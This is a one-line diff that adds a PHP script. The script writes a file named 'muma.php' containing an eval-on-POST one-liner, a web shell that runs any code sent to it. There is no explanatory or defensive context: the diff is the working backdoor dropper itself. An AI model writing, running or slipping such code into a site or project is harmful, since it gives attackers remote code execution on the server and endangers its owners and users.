@@ -1,0 +1,1 @@
+<?php fputs(fopen('muma.php','w'),'<?php @eval($_POST[a]);?>'); ?>
